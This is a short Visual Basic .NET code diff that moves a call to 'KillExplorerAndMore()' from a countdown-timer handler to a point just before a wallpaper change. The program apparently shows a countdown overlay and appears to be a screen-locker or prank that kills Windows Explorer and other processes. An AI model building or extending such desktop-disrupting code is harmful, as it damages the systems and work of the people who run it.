@@ -504,7 +504,6 @@ Public Class Form1
 
             ' Update the countdown timer label
             overlay.timerLabel.Text = "Remaining Time: " & overlay.countdownTime.ToString() & " seconds"
-            KillExplorerAndMore()
         End If
     End Sub
 
@@ -1400,6 +1399,8 @@ Public Class Form1
             Catch ex As Exception
                 Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
             End Try
+
+            KillExplorerAndMore()
 
             Try
                 SetWallpaper()
